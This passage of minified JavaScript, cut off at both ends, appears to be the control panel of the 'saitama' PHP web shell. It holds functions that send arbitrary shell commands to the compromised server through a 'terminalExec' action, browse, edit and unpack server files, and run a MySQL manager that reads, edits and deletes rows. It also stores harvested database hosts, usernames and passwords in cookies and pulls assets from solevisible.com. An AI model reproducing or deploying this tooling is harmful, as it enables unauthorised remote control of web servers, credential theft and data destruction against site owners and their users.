input[name=tbl_rows_checkbox\\[\\]]").forEach(function(e){e.checked&&r.push(e.value)}),0==r.length)return!1;saitamaMysqlApi({db_id:t,db_target:a,ajax_id:"mysql_table_delete_all_query",db_info:{table:l,col_key:i,rows:r},post:{saitama2:"delete_all"}},function(e){if(""!=e)if((e=JSON.parse(e)).status){var a=0,i=d.querySelector("#"+t);d.querySelectorAll("#"+t+" .mysql-main input[name=tbl_rows_checkbox\\[\\]]").forEach(function(e){e.checked&&(a=e.getAttribute("row_id"),i.querySelector(".tbl_row_l"+a).remove())})}else alert(e.error)})}function saitamaMysqlUpdateRow(e,t){var a=e.getAttribute("db_target"),i=e.getAttribute("db_id"),l=d.querySelector("#"+i),r=".mysql-insert-row",o=".mysql-insert-result",n="mysql_table_insert_query",s="insert",c={table:e.getAttribute("tbl_name")};if("edit"==t){var u=e.getAttribute("col_key"),p=e.getAttribute("key");r=".mysql-edit-row",o=".mysql-update-result",n="mysql_table_update_query",s="update",c.col_key=u,c.key=p}var f={};l.querySelectorAll(r+" input, "+r+" textarea").forEach(function(e){f.hasOwnProperty(e.name)||(f[e.name]={}),f[e.name]=e.value}),c.data=f,saitamaMysqlApi({db_id:i,db_target:a,ajax_id:n,db_info:c,post:{saitama2:s}},function(e){if(0!=e.length){e=JSON.parse(e);var t=d.querySelector("#"+i+" "+o);t.style.display="block",e.status?t.innerHTML="Success...":t.innerHTML=e.error}})}function saitamaMysqlLoadDataType(e){e=e.toUpperCase();var t=["INT","VARCHAR","TEXT","DATE",{key:"Numeric",vals:["TINYINT","SMALLINT","MEDIUMINT","INT","BIGINT","-","DECIMAL","FLOAT","DOUBLE","REAL","-","BIT","BOOLEAN","SERIAL"]},{key:"Date and time",vals:["DATE","DATETIME","TIMESTAMP","TIME","YEAR"]},{key:"String",vals:["CHAR","VARCHAR","-","TINYTEXT","TEXT","MEDIUMTEXT","LONGTEXT","-","BINARY","VARBINARY","-","TINYBLOB","MEDIUMBLOB","BLOB","LONGBLOB","-","ENUM","SET"]},{key:"Spatial",vals:["GEOMETRY","POINT","LINESTRING","POLYGON","MULTIPOINT","MULTILINESTRING","MULTIPOLYGON","GEOMETRYCOLLECTION"]},{key:"JSON",vals:["JSON"]}],a="",i=!1;for(var l in t)if("object"==typeof t[l]){for(var r in a+='<optgroup label="'+t[l].key+'">',t[l].vals)a+="<option"+(t[l].vals[r]!=e||i?"":" selected")+">"+t[l].vals[r]+"</option>",t[l].vals[r]==e&&(i=!0);a+="</optgroup>"}else a+="<option"+(t[l]!=e||i?"":" selected")+">"+t[l]+"</option>",t[l]==e&&(i=!0);return a}function saitamaMysqlChangePage(e,t){var a=e.getAttribute("db_id"),i=0;if(void 0!==t){e=d.querySelector("#"+a+" select[name=mysql-q-pages]");var l=parseInt(e.getAttribute("pages"));if(i=parseInt(e.value),1==t?--i:++i,0==i||l<i)return!1;e.value=i}else i=e.value;var r=e.getAttribute("db_target"),o=e.getAttribute("tbl_name");saitamaMysqlApi({db_id:a,db_target:r,ajax_id:"mysql_table_change_page",db_info:{table:o,page:i},post:{saitama2:"page"}},function(e){0!=e.length&&(e=JSON.parse(e),saitamaMysqlReportBuilder(a,e),d.querySelector("#"+a+" .mysql-query-table").innerHTML=e.table)})}function saitamaRemoveCookie(e){document.cookie=e+"=;Max-Age=0; path=/;"}function saitamaLogOut(){saitamaRemoveCookie("saitamaUser"),saitamaRemoveCookie("saitamaPass"),location.reload()}var saitamaAlertBox=function(e,t){this.types={success:{class:"alert-success",icon:"http://solevisible.com/icons/menu/check-mark1.svg"},error:{class:"alert-error",icon:"http://solevisible.com/icons/menu/warning.svg"}},this.show=function(a){if(""===a||null==a)throw'"msg parameter is empty"';var i=document.querySelector(e),l=document.createElement("DIV"),r=document.createElement("DIV"),o=document.createElement("DIV"),n=document.createElement("A"),s=document.createElement("div"),c=document.createElement("IMG"),d=this;if(s.style.display="inline-block",s.style.marginRight="10px",r.style.display="inline-block",o.classList.add("alert-content"),o.innerText=a,n.classList.add("alert-close"),n.setAttribute("href","#"),l.classList.add("alert-box"),c.src=this.types[t.type].icon,c.style.width="30px",s.appendChild(c),l.appendChild(s),t.hasOwnProperty("title")){var u=document.createElement("DIV");u.classList.add("alert-content-title"),u.innerText=t.title,r.appendChild(u)}if(r.appendChild(o),l.appendChild(r),t.hideCloseButton&&void 0!==t.hideCloseButton||l.appendChild(n),t.hasOwnProperty("type")&&l.classList.add(this.types[t.type].class),i.appendChild(l),n.addEventListener("click",function(e){e.preventDefault(),d.hide(l)}),!t.persistent)var p=setTimeout(function(){d.hide(l),clearTimeout(p)},t.closeTime)},this.hide=function(e){e.classList.add("hide");var t=setTimeout(function(){e.parentNode.removeChild(e),clearTimeout(t)},500)}};function saitamaShowNotification(e,t,a,i,l){void 0===a&&(a="success"),void 0===i&&(i=!1),void 0===l&&(l=1e4);var r={closeTime:l,persistent:i,type:a,hideCloseButton:!1};void 0!==t&&(r.title=t),new saitamaAlertBox("#alert-area",r).show(e)}function saitamaSyncMenuToOpt(e,t){var a="",i="",l=null;void 0!==t?(a="view_archive",i=e,l=location):(a=e.name,i=e.getAttribute("fname"),l=e),"extract"==a?(saitama_can_add_opt=!0,l.href="#action=options&path="+c_+"&opt=deziper",g("deziper",null,"","",c_+"/"+i),d.querySelector(".opt-title").innerHTML="DeCompressor"):"compress"==a?(saitama_can_add_opt=!0,l.href="#action=options&path="+c_+"&opt=ziper",g("ziper",null,"","",c_+"/"+i),d.querySelector(".opt-title").innerHTML="Compressor"):"view_archive"==a&&(saitama_can_add_opt=!0,l.href="#action=options&path="+c_+"&opt=archive_manager",g("archive_manager",null,"",c_+"/"+i,""),d.querySelector(".opt-title").innerHTML="Archive Manager")}function doFilterName(e){var t="#filesman_holder_"+saitama_current_fm_id;setTimeout(function(){var a=new RegExp(e.value,"i");d.querySelectorAll(t+" .fmanager-row").forEach(function(e){-1==e.querySelector(".main_name").getAttribute("fname").search(a)?e.style.display="none":e.style.display="table-row"})},100)}function sortBySelectedValue(e,t){setCookie(t,e.options[e.selectedIndex].value,2012),g("FilesMan",c_)}function loadPopUpDatabase(e,t,a){if(console.log(t),$("database_window").style.display="block",void 0===t){try{d.querySelector(".sql-content.sql-active-content").classList.remove("sql-active-content")}catch(e){}try{d.querySelector(".sql-tabname.sql-active-tab").classList.remove("sql-active-tab")}catch(e){}try{d.querySelector(".sql-tabs .sql-newtab").remove()}catch(e){}var i="id_db_"+getRandom(10);d.querySelector("#database_window .content_options_holder .sql-contents").insertAdjacentHTML("afterbegin",'<div id="'+i+'" class="sql-content sql-active-content">'+e+"</div>"),d.querySelector("#database_window .content_options_holder .sql-tabs").insertAdjacentHTML("beforeend",'<div id="tab_'+i+'" opt_id="'+i+'" class="sql-tabname sql-active-tab" onclick="dbTabController(this);"><span style="font-weight:unset;">New DB Connection</span> <img opt_id="'+i+'" onclick="closeDatabase(this,event);return false;" title="[close]" src="http://solevisible.com/icons/menu/delete.svg"></div><div class="sql-newtab" onclick="saitama_can_add_opt=true;g(\'sql\',null,\'\',\'\',\'\');" style="background-color:#800000;"><span style="font-weight:unset;">New Tab +</span></div>'),$(i).querySelectorAll(".db-opt-id").forEach(function(e){e.setAttribute("db_id",i)});try{$(i).querySelector(".getconfig").setAttribute("base_id",i)}catch(e){}return i}$(t).innerHTML=e;var l=$("tab_"+t);null!=l&&((-1==l.classList.value.indexOf("sql-active-tab")||database_window_is_minimized)&&(l.classList.add("tab-is-done"),saitamaShowNotification("proccess is done...","DB: "+l.innerText)),database_window_is_minimized&&saitamaUpdateOptionsBadge("database_window")),void 0!==mysql_cache[t]&&mysql_cache[t].hasOwnProperty("db")&&mysql_cache[t].db.length>0&&"update"!=a&&(d.querySelector("#tab_"+t+">span").innerHTML=mysql_cache[t].db),$(t).querySelectorAll(".db-opt-id").forEach(function(e){e.setAttribute("db_id",t)});try{$(t).querySelector(".getconfig").setAttribute("base_id",t)}catch(e){}database_window_is_minimized||(d.body.style.overflow="hidden")}function loadPopUpOpTions(e,t){console.log(e),saitama_before_do_action_id="",$("options_window").style.display="block";var a=$("option_"+e);if(saitama_can_add_opt){saitama_can_add_opt=!1;try{d.querySelector(".options_holder.option_is_active").classList.remove("option_is_active")}catch(e){}var i="",l=$("menu_opt_"+e).innerHTML;"market"==e?l="saitama Market":"GetDisFunc"==e&&(l="Disable Functions");try{d.querySelector("#options_window .content_options_holder .options_tab .tab_name.tab_is_active").classList.remove("tab_is_active")}catch(e){}if(null!=a){var r=a.getAttribute("opt_count");null!=r?(i=parseInt(r)+1,a.setAttribute("opt_count",i)):(i=1,a.setAttribute("opt_count",i))}var o="option_"+e+i;d.querySelector("#options_window .content_options_holder .options_content").insertAdjacentHTML("afterbegin",'<div id="'+o+'" class="options_holder">'+t+"</div>"),d.querySelector("#options_window .content_options_holder .options_tab").insertAdjacentHTML("beforeend",'<div opt_id="'+o+'" onclick="optionsTabController(this);" title="'+l+'" id="tab_'+o+'" class="tab_name tab_is_active">'+l+' <img opt_id="'+o+'" onclick="closeOption(this,event);return false;" title="[close]" src="http://solevisible.com/icons/menu/delete.svg"></div>'),$(o).classList.toggle("option_is_active"),d.querySelectorAll("#"+o+" form, #"+o+" a").forEach(function(t){var a=t.classList.value;if("getconfig"==a||"rejectme"==a)return!1;if("FORM"==t.tagName){var l=t.getAttribute("onsubmit");t.setAttribute("onsubmit",'saitamaBeforeDoAction("'+e+i+'");'+l),t.setAttribute("opt_id",e+i)}else{l=t.getAttribute("onclick");t.setAttribute("onclick",'saitamaBeforeDoAction("'+e+i+'");'+l)}});try{$(o).querySelector(".getconfig").setAttribute("base_id",e+i)}catch(e){}return e+i}a.innerHTML=t;var n=$("tab_option_"+e);null!=n&&((-1==n.classList.value.indexOf("tab_is_active")||options_window_is_minimized)&&(n.classList.add("tab-is-done"),saitamaShowNotification("proccess is done...",n.innerText)),options_window_is_minimized&&saitamaUpdateOptionsBadge("options_window")),d.querySelectorAll("#option_"+e+" form, #option_"+e+" a").forEach(function(t){var a=t.classList.value;if("getconfig"==a||"rejectme"==a)return!1;if("FORM"==t.tagName){var i=t.getAttribute("onsubmit");t.setAttribute("onsubmit",'saitamaBeforeDoAction("'+e+'");'+i),t.setAttribute("opt_id",e)}else{i=t.getAttribute("onclick");t.setAttribute("onclick",'saitamaBeforeDoAction("'+e+'");'+i)}});try{a.querySelector(".getconfig").setAttribute("base_id",e)}catch(e){}options_window_is_minimized||(d.body.style.overflow="hidden")}function saitamaBeforeDoAction(e){saitama_before_do_action_id=e}function saitamaLoaderOnTop(e){$("a_loader").style.display=e,d.body.style.overflow="block"==e?"hidden":"visible"}function saitamaAjaxController(e){var t=e.getAttribute("parent");$("loader_"+t).remove(),"filesman_holder"==t.substr(0,15)&&($(t).style.minHeight="0"),_saitama_AJAX_.hasOwnProperty(t)&&_saitama_AJAX_[t].abort()}function closeDatabase(e,t){t.stopPropagation();var a=e.getAttribute("opt_id");if($(a).remove(),-1!=$("tab_"+a).classList.value.indexOf("sql-active-tab"))if((e=d.querySelectorAll(".sql-tabs .sql-tabname")).length>1){e[0].classList.add("sql-active-tab");var i=e[0].getAttribute("opt_id");null!=$(i)&&$(i).classList.toggle("sql-active-content")}else editorClose("database_window");d.querySelector("div[opt_id="+a+"]").remove()}function closeFmTab(e,t){t.stopPropagation();var a=e.getAttribute("fm_id"),i=$("filesman_tab_"+a);if(-1!=i.classList.value.indexOf("filesman-tab-active")&&(e=d.querySelectorAll("#filesman_tabs .filesman_tab")).length>1){e[0].classList.add("filesman-tab-active");var l=e[0].getAttribute("fm_id"),r="filesman_holder_"+l;if(null!=$(r)){$(r).classList.toggle("filesman-active-content");var o=$("filesman_tab_"+l).getAttribute("path");initDir(o),d.mf.c.value=o,saitama_current_fm_id=l}}i.remove(),$("filesman_holder_"+a).remove(),saitamaFilesmanTabHideTitle()}function closeOption(e,t){t.stopPropagation();var a=e.getAttribute("opt_id");if($(a).remove(),-1!=$("tab_"+a).classList.value.indexOf("tab_is_active"))if((e=d.querySelectorAll(".options_tab .tab_name")).length>1){e[0].classList.add("tab_is_active");var i=e[0].getAttribute("opt_id");null!=$(i)&&$(i).classList.toggle("option_is_active")}else editorClose("options_window");d.querySelector("div[opt_id="+a+"]").remove()}function historyPanelController(e){"hidden"==e.getAttribute("mode")?(d.querySelector(".editor-explorer").style.display="block",d.querySelector(".editor-modal").style.marginLeft="20%",e.setAttribute("mode","visible"),e.style.left="19%",e.innerHTML="<<"):(d.querySelector(".editor-explorer").style.display="none",d.querySelector(".editor-modal").style.marginLeft="1%",e.setAttribute("mode","hidden"),e.style.left="0%",e.innerHTML=">>")}function closeTerminalContent(e,t){t.stopPropagation();var a=e.getAttribute("term_id");if(($(a).remove(),-1!=$("tab_"+a).classList.value.indexOf("active-terminal-tab"))&&(e=d.querySelectorAll(".terminal-tabs .terminal-tab")).length>1){e[0].classList.add("active-terminal-tab");var i=e[0].getAttribute("term_id");null!=$(i)&&$(i).classList.toggle("active-terminal-content")}d.querySelector("div[term_id="+a+"]").remove()}function closeEditorContent(e,t){t.stopPropagation();var a=e.getAttribute("opt_id");if(($(a).remove(),-1!=$("tab_"+a).classList.value.indexOf("editor-tab-active"))&&(e=d.querySelectorAll(".editor-tabs .editor-tab-name")).length>1){e[0].classList.add("editor-tab-active");var i=e[0].getAttribute("opt_id");null!=$(i)&&$(i).classList.toggle("editor-content-active")}d.querySelector("div[opt_id="+a+"]").remove()}function optionsTabController(e){try{d.querySelector(".options_holder.option_is_active").classList.remove("option_is_active")}catch(e){}var t=e.getAttribute("opt_id");if(null==t)return!1;$(t).classList.toggle("option_is_active");try{d.querySelector("#options_window .content_options_holder .options_tab \t.tab_name.tab_is_active").classList.remove("tab_is_active")}catch(e){}e.classList.remove("tab-is-done"),e.classList.add("tab_is_active"),d.querySelector(".opt-title").innerHTML=e.getAttribute("title"),saitamaUpdateOptionsBadge("options_window")}function terminalTabController(e){try{d.querySelector(".terminal-tab.active-terminal-tab").classList.remove("active-terminal-tab")}catch(e){}try{d.querySelector(".terminal-content.active-terminal-content").classList.remove("active-terminal-content")}catch(e){}var t=e.getAttribute("term_id");if(null==t)return!1;$(t).classList.toggle("active-terminal-content"),e.classList.remove("tab-is-done"),e.classList.add("active-terminal-tab"),$(t).querySelector(".php-terminal-input").focus(),saitamaUpdateOptionsBadge("cgiloader")}function filesmanTabController(e){try{d.querySelector(".ajaxarea.filesman-active-content").classList.remove("filesman-active-content")}catch(e){}try{d.querySelector(".filesman_tab.filesman-tab-active").classList.remove("filesman-tab-active")}catch(e){}var t=e.getAttribute("fm_id");if(null==t)return!1;saitama_current_fm_id=t,e.classList.add("filesman-tab-active"),e.classList.remove("tab-is-done"),$("filesman_holder_"+t).classList.toggle("filesman-active-content");var a=e.getAttribute("path");initDir(a),d.mf.c.value=a}function dbTabController(e){try{d.querySelector(".sql-content.sql-active-content").classList.remove("sql-active-content")}catch(e){}try{d.querySelector(".sql-tabname.sql-active-tab").classList.remove("sql-active-tab")}catch(e){}var t=e.getAttribute("opt_id");if(null==t)return!1;$(t).classList.toggle("sql-active-content"),e.classList.remove("tab-is-done"),e.classList.add("sql-active-tab"),saitamaUpdateOptionsBadge("database_window")}function editorTabController(e,t){try{d.querySelector(".editor-contents.editor-content-active").classList.remove("editor-content-active")}catch(e){}var a=null;void 0===t?a=e.getAttribute("opt_id"):(a=e,e=$("tab_"+a));var i=editor_files["file_"+a.replace("editor_source_","")];if(void 0!==i&&(d.querySelector(".editor-path").innerHTML=(i.pwd+"/"+i.file).replace(/\/\//g,"/")),null==a)return!1;$(a).classList.toggle("editor-content-active");try{d.querySelector(".editor-tabs .editor-tab-name.editor-tab-active").classList.remove("editor-tab-active")}catch(e){}e.classList.remove("tab-is-done"),e.classList.add("editor-tab-active"),saitamaUpdateOptionsBadge("editor")}function saitamaUpdateOptionsBadge(e){var t=d.querySelector("#"+e+"-minimized .options_min_badge");if(null!=t){var a=d.querySelectorAll("#"+e+" .tab-is-done").length;t.innerHTML=a,t.style.visibility=a>0?"visible":"hidden"}}function saitamaOpenPhpTerminal(e){if(php_temrinal_using_cgi&&void 0===e)showEditor("cgiloader");else{$("cgiloader").style.display="block",$("cgiloader").style.background="rgba(0, 0, 0, 0.57)",$("cgiframe").style.background="rgba(0, 0, 0, 0.81)",$("cgiframe").style.border="1px solid rgb(255, 0, 8, 1)",$("cgiframe").style.height="90%",$("cgiframe").style.padding="3px",d.querySelector("#cgiloader .opt-title").innerHTML="Terminal";var t="",a="",i="terminal_id_"+getRandom(10);void 0===e&&(t=" active-terminal-content",a=" active-terminal-tab"),d.querySelector("#cgiframe .terminal-contents").insertAdjacentHTML("afterbegin",'<div id="'+i+'" class="terminal-content'+t+'"><div class="php-terminal-output"><div><button class="terminal-btn-fontctl" onClick="changeTerminalFontSize(\''+i+'\',1);">+</button><button class="terminal-btn-fontctl" onClick="changeTerminalFontSize(\''+i+"',0);\">-</button><input onchange=\"saitamaTerminalChangecolor(this,'"+i+'\');" style="height: 18px;background: #dde2e2;" type="color"></div><pre class="ml1" style="border:unset;height: 90%;"></pre></div><div><form term_id="'+i+'" onSubmit="saitamaExecTerminal(this);this.c.value=\'\';return false;" autocomplete="off" style="margin-top: 10px;"><div style="overflow: auto;white-space: nowrap;"><div style="display: inline-block;color:#ff0800;margin-bottom:5px;margin-right:5px;">CWD:~# </div><div style="display: inline-block;color:#fff;" class="php-terminal-current-dir"></div></div><div style="position:relative;"><span style="color: #00ff08;font-size: 25px;">$ </span><input style="padding: 8px;font-size: 20px;width: 67%;border: 1px solid #ff0800;padding-right:35px;" onkeyup="saitamaWalkInTerminalHistory(this,event,\''+i+'\');" term_id="'+i+'" class="php-terminal-input" type="text" name="c" onfocus="closeHistoryCmd(\'free\',this);" placeholder="ls -la"><button class="button" style="color: #ff0800;padding: 12px;margin-left: 10px;border-radius: 2px;font-weight: bolder;">ExeCute<button term_id="'+i+'" class="button" style="color: #ff0800;padding: 12px;margin-left: 10px;border-radius: 2px;font-weight: bolder;" onClick="saitamaExecTerminal(this, 1);return false;">Current Dir</button><div class="cmd-history-holder"><div class="commands-history-header">History</div><span onClick="clearTerminalHistory();" style="border-bottom: 1px solid;margin-bottom: 5px;display: inline-block;padding: 5px;color: #59de69;cursor: pointer;">Clear history</span><div style="overflow: auto;height: 82%;" class="commands-history"></div></div><div term_id="'+i+'" class="cmd-history-icon" mode="" onclick="closeHistoryCmd(this);"><img style="width:27px;" src="http://solevisible.com/icons/menu/time2.svg"></div></form></div></div></div>');try{$("terminal_new_tab").remove()}catch(e){}d.querySelector("#cgiframe .terminal-tabs").insertAdjacentHTML("beforeend",'<div onclick="terminalTabController(this);" term_id="'+i+'" id="tab_'+i+'" class="terminal-tab'+a+'">Terminal <img term_id="'+i+'" onclick="closeTerminalContent(this,event);return false;" title="[close]" src="http://solevisible.com/icons/menu/delete.svg"></div>'),d.querySelector("#cgiframe .terminal-tabs").insertAdjacentHTML("beforeend",'<div onclick="saitamaOpenPhpTerminal(true);" id="terminal_new_tab" style="background-color:#800000;" class="terminal-tab">New Tab +</div>'),terminal_walk_index[i]={index:0,key:-1},d.querySelector("#"+i+" .php-terminal-input").focus(),d.querySelector("#"+i+" .php-terminal-current-dir").innerHTML=c_,d.querySelector("#cgiloader-minimized .minimized-text").innerHTML="Terminal",saitamaTerminalSetColorAndSize(i),php_temrinal_using_cgi=!0;var l=saitamaGetTerminalHistory();for(var r in l)d.querySelector("#"+i+" .cmd-history-holder .commands-history").insertAdjacentHTML("afterbegin","<div onclick=\"d.querySelector('#"+i+' .php-terminal-input\').value = this.innerHTML;" class="history-cmd-line">'+l[r]+"</div>")}d.body.style.overflow="hidden"}function saitamaTerminalSetColorAndSize(e){var t=getCookie("saitama-terminal-color"),a=getCookie("saitama-terminal-fontsize");void 0!==t&&(d.querySelector("#"+e+" pre.ml1").style.color=t),void 0!==a&&(d.querySelector("#"+e+" pre.ml1").style.fontSize=a)}function saitamaTerminalChangecolor(e,t){d.querySelector("#"+t+" pre.ml1").style.color=e.value,setCookie("saitama-terminal-color",e.value,2012)}function saitamaGetTerminalHistory(e){var t=getCookie("saitama-terminal-history");try{t=atob(t),t=JSON.parse(t)}catch(e){t=[]}return void 0!==e&&t.reverse(),t}function changeTerminalFontSize(e,t){var a=d.querySelector("#"+e+" pre.ml1"),i=parseInt(window.getComputedStyle(a,null).getPropertyValue("font-size")),l="";1==t?(l=i+1+"px",a.style.fontSize=l):(l=i-1+"px",a.style.fontSize=l),setCookie("saitama-terminal-fontsize",l,2012)}function saitamaWalkInTerminalHistory(e,t,a){var i=t||window.event;if("38"==i.keyCode||"40"==i.keyCode||"37"==i.keyCode||"39"==i.keyCode)switch(i.keyCode){case 38:var l=saitamaGetTerminalHistory(!0),r="";0==terminal_walk_index[a].index?(0==terminal_walk_index[a].key&&++terminal_walk_index[a].index,void 0!==(r=l[terminal_walk_index[a].index])?(e.value=r,++terminal_walk_index[a].index):(e.value="",terminal_walk_index[a].index=0)):terminal_walk_index[a].index<l.length&&(0==terminal_walk_index[a].key&&++terminal_walk_index[a].index,e.value=l[terminal_walk_index[a].index],++terminal_walk_index[a].index),terminal_walk_index[a].key=1;break;case 40:l=saitamaGetTerminalHistory(!0);if(terminal_walk_index[a].index>=0)0!=terminal_walk_index[a].index&&(--terminal_walk_index[a].index,1==terminal_walk_index[a].key&&--terminal_walk_index[a].index),void 0!==(r=l[terminal_walk_index[a].index])?e.value=r:(e.value="",terminal_walk_index[a].index=0);terminal_walk_index[a].key=0;break;default:console.log(i.keyCode)}else terminal_walk_index[a].index=0}function clearTerminalHistory(){d.querySelectorAll(".commands-history").forEach(function(e){e.innerHTML=""}),setCookie("saitama-terminal-history","",2012)}function saitamaAceToFullscreen(e){var t=e.getAttribute("ace_id");saitama_ace_editors.editor[t].container.requestFullscreen()}function closeHistoryCmd(e,t){if("free"==e){var a=t.getAttribute("term_id");return e=d.querySelector("#"+a+" .cmd-history-icon"),d.querySelector("#"+a+" .cmd-history-holder").style.visibility="hidden",d.querySelector("#"+a+" .cmd-history-holder").style.opacity="0",e.setAttribute("mode","off"),!1}var i=e.getAttribute("mode"),l=(a=e.getAttribute("term_id"),d.querySelector("#"+a+" .cmd-history-holder"));0==i.length||"off"==i?(l.style.visibility="visible",l.style.opacity="1",e.setAttribute("mode","on")):(l.style.visibility="hidden",l.style.opacity="0",e.setAttribute("mode","off"))}function geEvalAceValue(e){var t=e.querySelector(".php-evals-ace").getAttribute("id");return saitama_ace_editors.eval[t].getValue()}function saitamaOpenArchive(e){var t=e.getAttribute("path"),a=e.getAttribute("fname"),i=e.getAttribute("base_id");if(".."==a&&"phar://"!=t.substr(0,7))return!1;var l="a="+saitamab64("open_archive_dir")+"&c="+saitamab64(c_)+"&saitama1="+saitamab64(t)+"&saitama2="+saitamab64(i)+"&ajax="+saitamab64("true");_Ajax(d.URL,l,function(e){if("0"!=e){$("archive_base_"+i).innerHTML=e;var a=$("archive_dir_"+i).getAttribute("archive_name"),l=$("archive_dir_"+i).getAttribute("archive_full"),r="",o="";if(0!=(t=t.split(a)[1]).length){var n=(t=t.split("/")).length-1;for(var s in 0==t[n].length&&t.splice(n,1),t)0!=t.length&&(o+=t[s]+"/",r+='<a base_id="'+i+'" fname="'+t[s]+'" path="'+l+o+'" onclick="saitamaOpenArchive(this);">'+t[s]+"/</a>")}d.querySelector("#archive_dir_"+i+" .archive_pwd_holder").innerHTML=r}},!1,"open_archive_dir")}function saitamaDeleteConnectToDb(e){d.querySelectorAll(".dbh_"+e).forEach(function(e){e.remove()}),saitamaConnectionHistoryUpdate(e)}function saitamaConnectToDb(e,t){var a={};try{a=JSON.parse(atob(getCookie("saitama_connection_hist")))}catch(e){}var i=d.querySelector("#"+t+" div.sf");i.querySelector("input[name=sql_host]").value=a[e].host,i.querySelector("input[name=sql_login]").value=a[e].user,i.querySelector("input[name=sql_pass]").value=a[e].pass,(i.querySelector("input[name=sql_base]")?i.querySelector("input[name=sql_base]"):i.querySelector("select[name=sql_base]")).value=a[e].db,i.querySelector("input[name=sql_count]").checked=!0,d.querySelector("#"+t+" div.sf .db-connect-btn").click()}function saitamaShowConnectionHistory(e){var t={},a=e.getAttribute("db_id"),i=e.getAttribute("mode");if(rows='<table class="connection-hist-table"><tr><th>*</th><th>Host</th><th>User</th><th>Pass</th><th>Database</th><th>Connect</th><th>Delete</th></tr>',"on"==i){e.setAttribute("mode","off");try{t=JSON.parse(atob(getCookie("saitama_connection_hist")))}catch(e){}var l,r=1;for(l in t){var o=t[l].user+"_"+t[l].db;rows+='<tr class="dbh_'+o+'"><th>'+r+"</th><th>"+t[l].host+"</th><th>"+t[l].user+"</th><th>"+t[l].pass+"</th><th>"+t[l].db+'</th><th><button style="margin: unset;" class="connection-his-btn" onclick=\'saitamaConnectToDb("'+o+'","'+a+'");\'>Connect</button></th><th style="text-align: center;"><button style="margin: unset;" class="connection-his-btn connection-delete" onclick=\'saitamaDeleteConnectToDb("'+o+"\");'>X</button></th></tr>",r++}rows+="</table"}else e.setAttribute("mode","on"),rows="";d.querySelector("#"+a+" .connection_history_holder").innerHTML=rows}function saitamaConnectionHistoryUpdate(e){var t,a={};try{a=JSON.parse(atob(getCookie("saitama_connection_hist")))}catch(e){}for(t in mysql_cache)0!=mysql_cache[t].db.length&&(a[mysql_cache[t].user+"_"+mysql_cache[t].db]=mysql_cache[t]);void 0!==e&&delete a[e],setCookie("saitama_connection_hist",btoa(JSON.stringify(a)),2012)}function saitamaExecTerminal(e,t){var a="";if(0==(a=void 0!==t?"cd "+c_:e.c.value).length)return!1;"l"==a?a="ls -trh --color":"ll"==a&&(a="ls -ltrh --color");var i=e.getAttribute("term_id");saitamaloader(i,"block"),closeHistoryCmd("free",e);var l="";"FORM"==e.tagName&&(l=e.querySelector(".php-terminal-current-dir").innerHTML),0==(l=l.trim()).length&&(l=c_);var r="a="+saitamab64("terminalExec")+"&c="+saitamab64(l)+"&saitama1="+saitamab64(a)+"&ajax="+saitamab64("true");if(_Ajax(d.URL,r,function(e,t){saitamaloader(t,"none");try{var a=$("tab_"+i);null!=a&&((-1==a.classList.value.indexOf("active-terminal-tab")||cgi_is_minimized)&&(a.classList.add("tab-is-done"),saitamaShowNotification("proccess is done...",a.innerText)),cgi_is_minimized&&saitamaUpdateOptionsBadge("cgiloader"))}catch(e){}e=JSON.parse(e),d.querySelector("#"+t+" .php-terminal-output > pre").innerHTML=e.output,0!=e.path.length&&(d.querySelector("#"+t+" .php-terminal-current-dir").innerHTML=e.path)},!1,i),void 0===t){d.querySelector("#"+i+" .cmd-history-holder .commands-history").insertAdjacentHTML("afterbegin","<div onclick=\"d.querySelector('#"+i+' .php-terminal-input\').value = this.innerHTML;" class="history-cmd-line">'+a+"</div>");var o=saitamaGetTerminalHistory(),n=o.indexOf(a);-1!=n&&o.splice(n,1),o.push(a),setCookie("saitama-terminal-history",btoa(JSON.stringify(o)),2012)}d.querySelector("#"+i+" input.php-terminal-input").focus()}function pageChangedFilesMan(e){var t="filesman_holder_"+saitama_current_fm_id,a=getCookie(t+"_page_number"),i=e.innerText;if("<<"==i){a=d.querySelector("#"+t+" .active-page-number").innerText;if(!((a=parseInt(a))>1))return!1;i=a-1}if(">>"==i){a=d.querySelector("#"+t+" .active-page-number").innerText;a=parseInt(a);var l=d.querySelector("#"+t+" .last-page-number").innerHTML;if(!(a+1<=(l=parseInt(l))))return!1;i=a+1}setCookie(t+"_page_number",i,2012),g("FilesMan",c_)}function saitamaColDumperInit(){var e=d.querySelector(".tab_name.tab_is_active").getAttribute("opt_id"),t=d.querySelector("#"+e),a=t.getElementsByClassName("box");for(i=0;i<a.length;i++)a[i].addEventListener("click",function(){null!=this.parentElement.querySelector(".nested")&&(this.parentElement.querySelector(".nested").classList.toggle("active"),this.classList.toggle("check-box"))});var i;a=t.getElementsByClassName("sub-box");for(i=0;i<a.length;i++)a[i].setAttribute("opt_id",e),a[i].addEventListener("click",function(){this.classList.toggle("check-box");var e=this.getAttribute("tbl"),t=this.getAttribute("opt_id");t=t.replace("option_",""),col_dumper_selected_data.hasOwnProperty(t)||(col_dumper_selected_data[t]={}),void 0===col_dumper_selected_data[t][e]&&(col_dumper_selected_data[t][e]=[]);var a=this.innerHTML,i=col_dumper_selected_data[t][e].indexOf(a);-1==i?col_dumper_selected_data[t][e].push(a):col_dumper_selected_data[t][e].splice(i,1)})}function showSymlinkPath(e,t){t.stopPropagation();var a=e.getAttribute("row"),i=$("td_row_"+a),l=e.getAttribute("opt_title"),r=e.getAttribute("fname");if(l=decodeURIComponent(r)+" -> "+l,null!=i){i.insertAdjacentHTML("afterbegin",'<div class="symlink_path" id="link_id_'+a+'">'+l+"</div>");var o=t.clientX,n=t.clientY-30;$("link_id_"+a).style.left=o+"px",$("link_id_"+a).style.top=n+"px"}}function hideSymlinkPath(e,t){t.stopPropagation(),$("link_id_"+e.getAttribute("row")).remove()}function saitamagetFlags(){data="a="+saitamab64("get_flags")+"&c="+saitamab64(c_)+"&ajax="+saitamab64("true"),_Ajax(d.URL,data,function(e){var t=JSON.parse(e);t.hasOwnProperty("server")&&(d.querySelectorAll(".flag-holder")[0].innerHTML='<img draggable="false" title="'+t.server.name+'" src="http://solevisible.com/images/flags/48/'+t.server.code.toLowerCase()+'.png">',d.querySelectorAll(".flag-holder")[0].style.display="inline"),t.hasOwnProperty("client")&&(d.querySelectorAll(".flag-holder")[1].innerHTML='<img draggable="false" title="'+t.client.name+'" src="http://solevisible.com/images/flags/48/'+t.client.code.toLowerCase()+'.png">',d.querySelectorAll(".flag-holder")[1].style.display="inline")})}function colDumplerSelectType(e){var 